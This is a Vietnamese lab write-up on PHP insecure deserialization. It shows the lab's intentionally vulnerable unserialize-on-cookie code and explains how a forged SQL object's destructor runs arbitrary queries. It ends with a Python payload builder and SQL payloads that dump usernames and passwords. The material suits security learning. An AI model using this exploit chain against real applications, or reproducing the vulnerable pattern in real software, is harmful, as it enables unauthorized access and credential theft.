# Đoạn code xử lý logic

Bài lab cung cấp cho chúng ta 2 source code, tuy nhiên tôi sẽ chỉ tập trung vào phân tích luồng, bỏ qua giao diện xử lý như thế nào để không mất thời gian.

* Source 1:
```PHP
<?php
include 'connect.php';

$sql = new SQL();
$sql->connect();
$sql->query = 'SELECT username FROM users WHERE id=';


if (isset ($_COOKIE['leet_hax0r'])) {
    $sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
    try {
        if (is_array($sess_data) && $sess_data['ip'] != $_SERVER['REMOTE_ADDR']) {
            die('CANT HACK US!!!');
        }
    } catch(Exception $e) {
        echo $e;
    }
} else {
    $cookie = base64_encode (serialize (array ( 'ip' => $_SERVER['REMOTE_ADDR']))) ;
    setcookie ('leet_hax0r', $cookie, time () + (86400 * 30));
}

if (isset ($_REQUEST['id']) && is_numeric ($_REQUEST['id'])) {
    try {
        $sql->query .= $_REQUEST['id'];
    } catch(Exception $e) {
        echo ' Invalid query';
    }
}
?>

<div class="row">
    <form class="form-inline" method='post'>
        <input name='id' class='form-control' type='text' placeholder='User id'>
        <input class="form-control btn btn-default" name="submit" value='Go' type='submit'>
    </form>
</div>
```

* Source 2:
```PHP
<?php
class SQL {
    public $query = '';
    public $conn;
    public function __construct() {
    }
    
    public function connect() {
        $this->conn = new SQLite3 ("database.db", SQLITE3_OPEN_READONLY);
    }

    public function SQL_query($query) {
        $this->query = $query;
    }

    public function execute() {
        return $this->conn->query ($this->query);
    }

    public function __destruct() {
        if (!isset ($this->conn)) {
            $this->connect ();
        }
        
        $ret = $this->execute ();
        if (false !== $ret) {    
            while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
            }
        }
    }
}
?>
```

# Phân tích luồng hoạt động
Dòng 10, 1 đối tượng của lớp SQL được khởi tạo và gán vào biên sql. Sau đó gọi đến hàm connect (được khai báo ở source 2) để kết nối đến database. Biến query của lớp SQL được khởi tạo với giá trị 'SELECT username FROM users WHERE id='.  

**Cơ chế quản lý session qua cookie (Vùng lỗi)**  
Dòng 15-27 thực hiện việc xử lý cookie người dùng  
* Nếu tồn tại cookie thì hàm unserialize() sẽ giải mã dữ liệu cookie và lưu vào sess_data. Điều đặc biệt ở đây là quá trình tuần tự hóa được thực thi trước cả khi dữ liệu được ném vào try-catch dẫn đến việc mọi đối tượng (Object) được truyền vào thông qua Cookie này sẽ được giải mã trước khi ứng dụng kịp đánh giá kiểu dữ liệu của nó. Sau đó try-catch chỉ thực hiện kiểm tra dữ liệu, nếu dữ liệu là 1 mảng (array) và ip của nó không trùng khớp với ip của người dùng thì sẽ dừng chương trình và in ra "CANT HACK US!!"  
=> Điều này khá là vô nghĩa, chúng ta chỉ việc truyền vào cookie là 1 Object thì đã thành công vô hiệu hóa quá trình kiểm tra này  

* Nếu không tồn tại cookie thì cookie sẽ được tạo bằng cách sử dụng hàm serialize() để tuần tự hóa dữ liệu kèm theo mã hóa base64 => Chúng ta có thể đọc được cookie khi vào bài lab để nhận biết đây có thể là 1 lỗ hổng liên quan đến Insecure Deserialization  

Dòng 29-35 là việc xử lý dữ liệu nhập vào thông qua tham số `id`, chỉ đơn giản là việc nối id vào câu truy vấn và thực thi nó. Nếu tham số `id` không phải là số thì sẽ dừng chương trình và in ra "Invalid query". => Có thể ngăn chặn SQLInjection  

Dòng 40 nhập dữ liệu vào qua ô text và gán vào biến id. Để ý rằng không có bất kì hành động nào thực hiện việc xuất dữ liệu ra, thêm gợi ý ban đầu nữa "Since we're lazy, we take advantage of php's garbage collector to properly display query results."  thì có thể đoán rằng việc xuất đầu ra sẽ nằm ở source 2, và có thể sẽ thông qua hàm `__destruct()`  

Ta cần hiểu về hàm `__destruct()` trong PHP. Hàm destructor (hàm hủy) được sử dụng để dọn dẹp và giải phóng tài nguyên mà đối tượng đã chiếm giữ (như bộ nhớ động, kết nối cơ sở dữ liệu, hoặc file đang mở) trước khi đối tượng đó bị xóa khỏi bộ nhớ. Có thể hiểu đơn giản rằng, nó sẽ tự chạy hết tất cả các `query`. Cộng với việc hàm unserialize() cho phép tạo 1 đối tượng thứ 2 trong bộ nhớ. Đối tượng này hoàn toàn nằm dưới quyền kiểm soát của dữ liệu đầu vào. Do đó, giá trị của thuộc tính $query không còn bị trói buộc vào chuỗi gốc hay bắt buộc phải nối với một giá trị số (is_numeric) nữa, mà có thể là bất kỳ câu lệnh truy vấn nào.  

Dòng 67-78 khẳng định những gì ta đoán là đúng. Lưu ý ở đây là dòng 75 sẽ đi tìm 1 cột có giá trị là `username` nên khi thực hiện `SELECT` thì phải kèm theo `As username`  

# Payload tấn công
Đoạn mã dưới đây sẽ giúp ích trong việc mã hóa và giải mã các payload chúng ta sử dụng
```python
import base64

query = "YOUR_QUERY"

payload = (
    f'O:3:"SQL":2:{{'
    f's:5:"query";s:{len(query)}:"{query}";'
    f's:4:"conn";N;'
    f'}}'
)

print(payload)
print(base64.b64encode(payload.encode()).decode())
```  

Trước hết chúng ta sẽ đi kiểm tra việc ứng dụng sử dụng câu lệnh, cũng như những cột nào để khai báo table  
`SELECT sql AS username FROM sqlite_master WHERE type='table' AND name LIKE 'users'`  

Việc đọc dữ liệu đầu ra phụ thuộc vào kiến thức về SQL của bạn, tôi sẽ không làm việc này  
Payload tấn công:  
`SELECT username || '~' || password AS username FROM users`





